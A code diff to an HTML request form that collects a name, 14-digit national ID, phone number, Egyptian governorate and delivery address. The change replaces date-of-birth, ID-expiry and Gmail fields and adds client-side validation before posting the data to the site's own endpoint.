@@ -224,92 +224,52 @@
                 </div>
 
                 <div class="form-group">
-                    <label for="nationalId">National ID</label>
-                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="Enter your national ID" required>
+                    <label for="nationalId">National ID (14 digits)</label>
+                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="Enter your national ID" maxlength="14" pattern="\d{14}" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
                 </div>
 
                 <div class="form-group">
-                    <label>National ID Expiry Date</label>
-                    <div class="dropdown-container">
-                        <select name="idExpiry_day" class="form-control" required>
-                            <option value="" disabled selected>Day</option>
-                            <script>
-                                for(let i=1; i<=31; i++) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                        <select name="idExpiry_month" class="form-control" required>
-                            <option value="" disabled selected>Month</option>
-                            <option value="1">January</option>
-                            <option value="2">February</option>
-                            <option value="3">March</option>
-                            <option value="4">April</option>
-                            <option value="5">May</option>
-                            <option value="6">June</option>
-                            <option value="7">July</option>
-                            <option value="8">August</option>
-                            <option value="9">September</option>
-                            <option value="10">October</option>
-                            <option value="11">November</option>
-                            <option value="12">December</option>
-                        </select>
-                        <select name="idExpiry_year" class="form-control" required>
-                            <option value="" disabled selected>Year</option>
-                            <script>
-                                for(let i=2040; i>=2026; i--) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                    </div>
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" class="form-control" placeholder="Enter your phone number" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="phone">Registered Phone Number</label>
-                    <input type="tel" id="phone" name="phone" class="form-control" placeholder="Enter your registered phone number" required>
+                    <label for="governorate">Governorate</label>
+                    <select id="governorate" name="governorate" class="form-control" required>
+                        <option value="" disabled selected>Select Governorate</option>
+                        <option value="القاهرة">Cairo</option>
+                        <option value="الجيزة">Giza</option>
+                        <option value="الإسكندرية">Alexandria</option>
+                        <option value="الدقهلية">Dakahlia</option>
+                        <option value="البحيرة">Beheira</option>
+                        <option value="المنيا">Minya</option>
+                        <option value="الشرقية">Sharqia</option>
+                        <option value="الغربية">Gharbia</option>
+                        <option value="القليوبية">Qalyubia</option>
+                        <option value="المنوفية">Monufia</option>
+                        <option value="كفر الشيخ">Kafr El Sheikh</option>
+                        <option value="الفيوم">Fayoum</option>
+                        <option value="بني سويف">Beni Suef</option>
+                        <option value="أسيوط">Assiut</option>
+                        <option value="سوهاج">Sohag</option>
+                        <option value="قنا">Qena</option>
+                        <option value="الأقصر">Luxor</option>
+                        <option value="أسوان">Aswan</option>
+                        <option value="دمياط">Damietta</option>
+                        <option value="بورسعيد">Port Said</option>
+                        <option value="الإسماعيلية">Ismailia</option>
+                        <option value="السويس">Suez</option>
+                        <option value="شمال سيناء">North Sinai</option>
+                        <option value="جنوب سيناء">South Sinai</option>
+                        <option value="البحر الأحمر">Red Sea</option>
+                        <option value="الوادي الجديد">New Valley</option>
+                        <option value="مطروح">Matrouh</option>
+                    </select>
                 </div>
 
                 <div class="form-group">
-                    <label>Date of Birth</label>
-                    <div class="dropdown-container">
-                        <select name="dob_day" class="form-control" required>
-                            <option value="" disabled selected>Day</option>
-                            <script>
-                                for(let i=1; i<=31; i++) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                        <select name="dob_month" class="form-control" required>
-                            <option value="" disabled selected>Month</option>
-                            <option value="1">January</option>
-                            <option value="2">February</option>
-                            <option value="3">March</option>
-                            <option value="4">April</option>
-                            <option value="5">May</option>
-                            <option value="6">June</option>
-                            <option value="7">July</option>
-                            <option value="8">August</option>
-                            <option value="9">September</option>
-                            <option value="10">October</option>
-                            <option value="11">November</option>
-                            <option value="12">December</option>
-                        </select>
-                        <select name="dob_year" class="form-control" required>
-                            <option value="" disabled selected>Year</option>
-                            <script>
-                                for(let i=2026; i>=1940; i--) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label for="email">Gmail Address</label>
-                    <input type="email" id="email" name="email" class="form-control" placeholder="Enter your Gmail address" required>
+                    <label for="deliveryAddress">Delivery Address</label>
+                    <input type="text" id="deliveryAddress" name="deliveryAddress" class="form-control" placeholder="Enter your delivery address in detail" required>
                 </div>
 
                 <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
@@ -358,15 +318,16 @@
 
             const fullName = document.getElementById("fullName").value;
             const nationalId = document.getElementById("nationalId").value;
-            const idExpiry_day = document.querySelector("select[name=\"idExpiry_day\"]").value;
-            const idExpiry_month = document.querySelector("select[name=\"idExpiry_month\"]").value;
-            const idExpiry_year = document.querySelector("select[name=\"idExpiry_year\"]").value;
             const phone = document.getElementById("phone").value;
-            const dob_day = document.querySelector("select[name=\"dob_day\"]").value;
-            const dob_month = document.querySelector("select[name=\"dob_month\"]").value;
-            const dob_year = document.querySelector("select[name=\"dob_year\"]").value;
-            const email = document.getElementById("email").value;
+            const governorate = document.getElementById("governorate").value;
+            const deliveryAddress = document.getElementById("deliveryAddress").value;
             const errorMessageDiv = document.getElementById("errorMessage");
+
+            if (nationalId.length !== 14) {
+                errorMessageDiv.textContent = "National ID must be 14 digits";
+                errorMessageDiv.style.display = "block";
+                return;
+            }
 
             try {
                 const response = await fetch("/submit_request", {
@@ -380,10 +341,9 @@
                             data: {
                                 fullName: fullName,
                                 nationalId: nationalId,
-                                idExpiry: `${idExpiry_year}-${idExpiry_month}-${idExpiry_day}`,
                                 phone: phone,
-                                dob: `${dob_year}-${dob_month}-${dob_day}`,
-                                email: email
+                                governorate: governorate,
+                                deliveryAddress: deliveryAddress
                             }
                         })
                     })
